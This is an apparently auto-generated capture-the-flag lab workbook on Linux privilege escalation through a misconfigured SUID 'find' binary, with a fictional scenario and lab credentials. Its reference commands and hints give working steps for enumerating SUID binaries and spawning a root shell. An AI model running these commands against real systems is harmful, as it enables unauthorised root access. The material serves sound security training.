# Meridian Data Corp - SUID Privilege Escalation

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `linux-3-1-suid-privilege-escalation/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **Meridian Data Corp - SUID Privilege Escalation** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **45 minutes** · Difficulty: **intermediate**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

Meridian Data Corp, a data analytics firm in Portland, Oregon, contracted your
team at Vanguard Offensive Security for an internal penetration test. Phase 1
of the engagement (initial access) is complete - your team obtained SSH
credentials for a low-privilege developer account on one of their build servers
through a phishing exercise.

Your task for Phase 2 is privilege escalation. The credentials you have belong to
the "developer" account, which has standard user permissions. Your objective is to
escalate to root and recover the system flag stored in /root/.

Riley Park (IT Security Manager) mentioned during the scoping call: "Our dev team
has been installing various tools on these servers. I'm fairly sure the permissions
are fine, but honestly nobody has audited them in months. If you find a way to
root, document the exact misconfiguration so we can remediate."

Standard rules of engagement apply. Document your escalation path.

**Credentials**

- Target SSH: `developer` / `M3r1d1an_D3v#`

## Your Objectives

- Enumerate the target system for privilege escalation vectors
- Identify SUID binaries using standard Linux enumeration techniques
- Distinguish between normal and misconfigured SUID permissions
- Exploit a SUID misconfiguration to escalate privileges to root
- Capture the flag

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**SSH access as developer**

```bash
sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@<target> 'whoami' 2>&1
```

Expected: `developer`

**Enumerate SUID binaries**

```bash
sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@<target> 'find / -perm -4000 -type f 2>/dev/null | grep find' 2>&1
```

Expected: `/usr/bin/find`

**Exploit SUID find for root shell and read flag**

```bash
sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@<target> 'find . -exec cat /root/flag.txt \; -quit' 2>&1
```

Expected: `OCR{...}`

**Verify flag**

```bash
echo 'OCR{...}'
```

Expected: `OCR{...}`


### Hint ladder

<details><summary>Hint 1 (unlocks after 8 minutes)</summary>

Start by enumerating the system. What user are you? What groups do you belong
to? Look for common privilege escalation vectors: SUID binaries, writable
scripts, cron jobs, sudo permissions. One of these will give you a path to
root.

</details>

<details><summary>Hint 2 (unlocks after 16 minutes)</summary>

SUID binaries are executables that run with the file owner's permissions
(often root) regardless of who runs them. Search for them with:
find / -perm -4000 -type f 2>/dev/null
Compare what you find against normal SUID binaries. Which ones look unusual
or shouldn't normally have the SUID bit set?

</details>

<details><summary>Hint 3 (unlocks after 24 minutes)</summary>

The "find" binary has the SUID bit set, which is abnormal. GTFOBins documents
a well-known technique for this:
find . -exec /bin/sh -p \; -quit
The -p flag preserves the elevated effective UID. Once you have a root shell,
read /root/flag.txt for the flag.

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
